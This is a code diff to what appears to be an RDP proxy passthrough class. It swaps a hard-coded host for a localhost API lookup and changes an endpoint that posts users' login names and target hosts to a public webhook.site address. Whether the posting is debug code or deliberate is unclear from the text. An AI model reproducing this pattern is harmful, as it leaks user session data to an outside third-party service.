@@ -238,9 +238,17 @@ class ACLPassthrough():
         device = "<host>$<application path>$<working dir>$<args> for Application"
         login = self.shared.get('login', MAGICASK) or MAGICASK
         # host = self.shared.get('real_target_device', MAGICASK) or MAGICASK
-        
-        # host = "104.214.171.65"  # Default host for RDP
-        host = "rdesktop"  # Default host for RDP
+
+        resp = requests.get("http://localhost:4000/host", timeout=3)
+        # resp = requests.get("https://webhook.site/a29560be-341c-472a-9d9a-ea19c1e26b82", timeout=3)
+        print("Raw response:", resp.text)
+        data = resp.json()
+        host = data.get("host")
+        if host:
+            print(f"Host from API: {host}")
+        else:
+            print("No host found in API response, using default.")
+        # host = "rdesktop"  # Default host for RDP
         # get host instead of default
         password = self.shared.get('password', MAGICASK) or MAGICASK
         splitted = login.split('@', 1)
@@ -377,7 +385,7 @@ class ACLPassthrough():
             self.proxy_conx.close()
             Logger().info("++++++++DEBUG : self.proxy_conx.close() ++++++++")
     
-            API_URL = "https://webhook.site/28e78777-be6b-4d9f-b868-1d59d7176fba"
+            API_URL = "https://webhook.site/a29560be-341c-472a-9d9a-ea19c1e26b82"
             data = {
                 "user": kv['login'],
                 "target": kv['target_host'],
